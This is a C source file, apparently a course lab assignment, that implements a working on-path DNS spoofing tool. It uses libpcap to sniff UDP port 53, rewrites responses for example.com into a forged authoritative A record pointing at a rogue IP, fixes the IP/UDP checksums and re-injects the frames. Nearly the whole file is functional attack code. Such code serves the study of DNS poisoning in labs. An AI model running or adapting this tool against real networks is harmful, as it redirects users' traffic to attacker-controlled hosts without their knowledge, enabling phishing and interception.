/*
 * CS6008 Phase 2 — on-path DNS response interceptor/forger.
 *
 * Sniffs UDP/53 on the given interface. Traffic not matching example.com is
 * relayed unchanged. A response for example.com, when forging is enabled,
 * has its DNS payload rewritten in place (same transaction ID, same
 * question, forged answer) and is sent on toward the resolver.
 *
 * Build: make
 * Run:   sudo ./interceptor -i eth0 -m <resolver_mac> [-s <own_mac>] [-f] [-r 172.16.1.30]
 *
 * -m is the next-hop MAC to frame outgoing packets toward (resolver's MAC,
 *    since the attacker sits on the same resolver-net bridge as resolver).
 *    Get it with: docker exec resolver cat /sys/class/net/eth0/address
 * -s is the attacker's own interface MAC, used as the new source MAC.
 *    If omitted, it's read automatically from /sys/class/net/<iface>/address.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <pcap/pcap.h>

#pragma pack(push, 1)
struct eth_hdr {
    uint8_t  dst[6];
    uint8_t  src[6];
    uint16_t ethertype;
};

struct ip_hdr {
    uint8_t  ver_ihl;
    uint8_t  tos;
    uint16_t total_len;
    uint16_t id;
    uint16_t flags_frag;
    uint8_t  ttl;
    uint8_t  proto;
    uint16_t checksum;
    uint32_t src;
    uint32_t dst;
};

struct udp_hdr {
    uint16_t sport;
    uint16_t dport;
    uint16_t len;
    uint16_t checksum;
};

struct dns_hdr {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};
#pragma pack(pop)

#define TARGET_NAME "example.com"
#define MAX_PKT 2048

static char    g_iface[64];
static int     g_forge = 0;
static char    g_rogue_ip[16] = "172.16.1.30";
static uint8_t g_src_mac[6];
static uint8_t g_dst_mac[6];
static pcap_t  *g_pcap;

/* ---- checksum helpers ----------------------------------------------- */

static uint16_t checksum16(const void *data, size_t len) {
    const uint16_t *p = data;
    uint32_t sum = 0;
    while (len > 1) { sum += *p++; len -= 2; }
    if (len) sum += *(const uint8_t *)p;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)~sum;
}

static uint16_t udp_checksum(struct ip_hdr *ip, struct udp_hdr *udp, uint8_t *payload, size_t paylen) {
    struct {
        uint32_t src, dst;
        uint8_t  zero, proto;
        uint16_t udp_len;
    } pseudo = { ip->src, ip->dst, 0, 17, udp->len };

    size_t total = sizeof(pseudo) + sizeof(struct udp_hdr) + paylen;
    uint8_t *buf = calloc(1, total + 1);
    memcpy(buf, &pseudo, sizeof(pseudo));
    struct udp_hdr udp_zerocksum = *udp;
    udp_zerocksum.checksum = 0;
    memcpy(buf + sizeof(pseudo), &udp_zerocksum, sizeof(udp_zerocksum));
    memcpy(buf + sizeof(pseudo) + sizeof(udp_zerocksum), payload, paylen);
    uint16_t cksum = checksum16(buf, total);
    free(buf);
    return cksum ? cksum : 0xFFFF; /* 0 means "no checksum" in UDP; avoid it */
}

/* ---- MAC parsing ------------------------------------------------------ */

static int parse_mac(const char *s, uint8_t *out) {
    unsigned int b[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6)
        return -1;
    for (int i = 0; i < 6; i++) out[i] = (uint8_t)b[i];
    return 0;
}

static int read_own_mac(const char *iface, uint8_t *out) {
    char path[128];
    snprintf(path, sizeof(path), "/sys/class/net/%s/address", iface);
    FILE *f = fopen(path, "r");
    if (!f) return -1;
    char buf[32] = {0};
    if (!fgets(buf, sizeof(buf), f)) { fclose(f); return -1; }
    fclose(f);
    return parse_mac(buf, out);
}

/* ---- DNS qname parsing -------------------------------------------------
 * Labels are length-prefixed: <len><bytes>...<len><bytes><0x00>.
 * Starts at offset sizeof(dns_hdr) (12) in dns_payload. Does not handle
 * compression pointers (0xC0 bit) — not needed for a question section we
 * read verbatim from a real query/response, which never compresses the
 * QUESTION's own name (only answers typically do, via 0xC00C pointers).
 * Returns number of bytes consumed (including the terminating zero), or
 * -1 on malformed input. Writes the dotted name into out.
 */
static int parse_qname(const uint8_t *dns_payload, size_t len, char *out, size_t outlen) {
    size_t pos = sizeof(struct dns_hdr);
    size_t outpos = 0;
    if (pos >= len) return -1;

    while (pos < len) {
        uint8_t label_len = dns_payload[pos];
        if (label_len == 0) { pos++; break; }               /* terminator */
        if (label_len & 0xC0) return -1;                      /* compression - not handled */
        if (pos + 1 + label_len >= len) return -1;             /* out of bounds */
        if (outpos + label_len + 1 >= outlen) return -1;       /* out buffer too small */

        memcpy(out + outpos, dns_payload + pos + 1, label_len);
        outpos += label_len;
        out[outpos++] = '.';
        pos += 1 + label_len;
    }
    if (outpos > 0) outpos--;       /* drop trailing dot */
    out[outpos] = '\0';
    return (int)pos;                /* bytes consumed from start of dns_payload */
}

static int is_target_response(const uint8_t *dns_payload, size_t len) {
    if (len < sizeof(struct dns_hdr)) return 0;
    const struct dns_hdr *h = (const struct dns_hdr *)dns_payload;
    uint16_t flags = ntohs(h->flags);
    int is_response = (flags >> 15) & 0x1;
    if (!is_response) return 0;
    char qname[256] = {0};
    if (parse_qname(dns_payload, len, qname, sizeof(qname)) < 0) return 0;
    return strcasecmp(qname, TARGET_NAME) == 0;
}

/* ---- Ethernet re-addressing: shared by relay and forge paths ---------- */

static void readdress_eth(uint8_t *pkt) {
    struct eth_hdr *eth = (struct eth_hdr *)pkt;
    memcpy(eth->src, g_src_mac, 6);
    memcpy(eth->dst, g_dst_mac, 6);
}

static void send_frame(uint8_t *pkt, size_t len) {
    readdress_eth(pkt);
    if (pcap_sendpacket(g_pcap, pkt, (int)len) != 0) {
        fprintf(stderr, "send failed: %s\n", pcap_geterr(g_pcap));
    }
}

static void relay_unchanged(const uint8_t *pkt, size_t len) {
    uint8_t buf[MAX_PKT];
    if (len > sizeof(buf)) return;
    memcpy(buf, pkt, len);
    send_frame(buf, len);
}

/* ---- forging ------------------------------------------------------------
 * Rewrites the DNS payload of a REAL intercepted response in place:
 * keep header's transaction ID, keep the question section verbatim,
 * drop any original answer/authority/additional records, append one
 * forged A answer pointing at g_rogue_ip. Recompute UDP/IP lengths and
 * checksums, re-address Ethernet, and send.
 */
static void build_and_send_forged_reply(const uint8_t *orig_pkt, size_t orig_len) {
    if (orig_len > MAX_PKT) return;

    uint8_t buf[MAX_PKT];
    memcpy(buf, orig_pkt, orig_len);

    struct ip_hdr *ip = (struct ip_hdr *)(buf + sizeof(struct eth_hdr));
    size_t ip_hlen = (ip->ver_ihl & 0x0F) * 4;
    struct udp_hdr *udp = (struct udp_hdr *)((uint8_t *)ip + ip_hlen);
    uint8_t *dns_payload = (uint8_t *)udp + sizeof(struct udp_hdr);
    size_t dns_cap = orig_len - (sizeof(struct eth_hdr) + ip_hlen + sizeof(struct udp_hdr));

    char qname[256];
    int qname_bytes = parse_qname(dns_payload, dns_cap, qname, sizeof(qname));
    if (qname_bytes < 0) {
        fprintf(stderr, "[forge] could not parse qname, relaying unchanged instead\n");
        relay_unchanged(orig_pkt, orig_len);
        return;
    }
    size_t question_len = (size_t)qname_bytes + 4; /* +QTYPE(2) +QCLASS(2) */

    /* --- rebuild DNS header flags/counts --- */
    struct dns_hdr *dns = (struct dns_hdr *)dns_payload;
    uint16_t flags = ntohs(dns->flags);
    flags |= 0x8000;   /* QR = 1 (response)   */
    flags |= 0x0400;   /* AA = 1 (we are pretending to be authoritative) */
    dns->flags = htons(flags);
    dns->qdcount = htons(1);
    dns->ancount = htons(1);
    dns->nscount = 0;
    dns->arcount = 0;

    /* --- append forged answer right after the question section --- */
    uint8_t *answer = dns_payload + sizeof(struct dns_hdr) + question_len;
    uint8_t  answer_rr[16];
    size_t   off = 0;
    answer_rr[off++] = 0xC0; answer_rr[off++] = 0x0C;   /* NAME: pointer to offset 12 (question name) */
    answer_rr[off++] = 0x00; answer_rr[off++] = 0x01;   /* TYPE = A */
    answer_rr[off++] = 0x00; answer_rr[off++] = 0x01;   /* CLASS = IN */
    uint32_t ttl = htonl(60);
    memcpy(answer_rr + off, &ttl, 4); off += 4;          /* TTL = 60s */
    answer_rr[off++] = 0x00; answer_rr[off++] = 0x04;    /* RDLENGTH = 4 */
    struct in_addr rogue;
    inet_pton(AF_INET, g_rogue_ip, &rogue);
    memcpy(answer_rr + off, &rogue.s_addr, 4); off += 4; /* RDATA = rogue IP */

    memcpy(answer, answer_rr, off);
    size_t new_dns_len = sizeof(struct dns_hdr) + question_len + off;

    /* --- fix up UDP length + checksum --- */
    udp->len = htons((uint16_t)(sizeof(struct udp_hdr) + new_dns_len));

    /* --- fix up IP total length + checksum --- */
    size_t new_total_len = ip_hlen + sizeof(struct udp_hdr) + new_dns_len;
    ip->total_len = htons((uint16_t)new_total_len);
    ip->checksum = 0;
    ip->checksum = checksum16(ip, ip_hlen);

    udp->checksum = 0;
    udp->checksum = udp_checksum(ip, udp, dns_payload, new_dns_len);

    size_t new_frame_len = sizeof(struct eth_hdr) + new_total_len;
    fprintf(stderr, "[*] forged A %s -> %s (frame %zu bytes)\n", qname, g_rogue_ip, new_frame_len);
    send_frame(buf, new_frame_len);
}

static void packet_handler(u_char *user, const struct pcap_pkthdr *hdr, const u_char *bytes) {
    (void)user;
    if (hdr->caplen < sizeof(struct eth_hdr) + sizeof(struct ip_hdr) + sizeof(struct udp_hdr))
        return;

    const struct ip_hdr *ip = (const struct ip_hdr *)(bytes + sizeof(struct eth_hdr));
    if (ip->proto != 17) return; /* UDP only */
    size_t ip_hlen = (ip->ver_ihl & 0x0F) * 4;
    const struct udp_hdr *udp = (const struct udp_hdr *)((const uint8_t *)ip + ip_hlen);
    const uint8_t *dns_payload = (const uint8_t *)udp + sizeof(struct udp_hdr);
    size_t dns_len = ntohs(udp->len) >= sizeof(struct udp_hdr) ? ntohs(udp->len) - sizeof(struct udp_hdr) : 0;

    if (g_forge && dns_len > 0 && is_target_response(dns_payload, dns_len)) {
        build_and_send_forged_reply(bytes, hdr->caplen);
        return;
    }
    relay_unchanged(bytes, hdr->caplen);
}

int main(int argc, char **argv) {
    int opt;
    g_iface[0] = '\0';
    char *src_mac_arg = NULL, *dst_mac_arg = NULL;

    while ((opt = getopt(argc, argv, "i:fr:m:s:")) != -1) {
        switch (opt) {
            case 'i': strncpy(g_iface, optarg, sizeof(g_iface) - 1); break;
            case 'f': g_forge = 1; break;
            case 'r': strncpy(g_rogue_ip, optarg, sizeof(g_rogue_ip) - 1); break;
            case 'm': dst_mac_arg = optarg; break;
            case 's': src_mac_arg = optarg; break;
            default:
                fprintf(stderr, "usage: %s -i <iface> -m <next_hop_mac> [-s <own_mac>] [-f] [-r <rogue-ip>]\n", argv[0]);
                return 1;
        }
    }
    if (!g_iface[0] || !dst_mac_arg) {
        fprintf(stderr, "must pass -i <iface> and -m <next_hop_mac>\n");
        return 1;
    }
    if (parse_mac(dst_mac_arg, g_dst_mac) < 0) { fprintf(stderr, "bad -m mac\n"); return 1; }

    if (src_mac_arg) {
        if (parse_mac(src_mac_arg, g_src_mac) < 0) { fprintf(stderr, "bad -s mac\n"); return 1; }
    } else if (read_own_mac(g_iface, g_src_mac) < 0) {
        fprintf(stderr, "could not auto-read MAC for %s, pass -s explicitly\n", g_iface);
        return 1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    g_pcap = pcap_open_live(g_iface, 65535, 1 /*promisc*/, 1000, errbuf);
    if (!g_pcap) { fprintf(stderr, "pcap_open_live: %s\n", errbuf); return 1; }

    struct bpf_program fp;
    if (pcap_compile(g_pcap, &fp, "udp port 53", 1, PCAP_NETMASK_UNKNOWN) == -1 ||
        pcap_setfilter(g_pcap, &fp) == -1) {
        fprintf(stderr, "filter setup failed: %s\n", pcap_geterr(g_pcap));
        return 1;
    }

    fprintf(stderr, "[*] listening on %s, forge=%d, rogue=%s, src=%02x:%02x:%02x:%02x:%02x:%02x dst=%02x:%02x:%02x:%02x:%02x:%02x\n",
            g_iface, g_forge, g_rogue_ip,
            g_src_mac[0], g_src_mac[1], g_src_mac[2], g_src_mac[3], g_src_mac[4], g_src_mac[5],
            g_dst_mac[0], g_dst_mac[1], g_dst_mac[2], g_dst_mac[3], g_dst_mac[4], g_dst_mac[5]);
    pcap_loop(g_pcap, 0, packet_handler, NULL);
    pcap_close(g_pcap);
    return 0;
}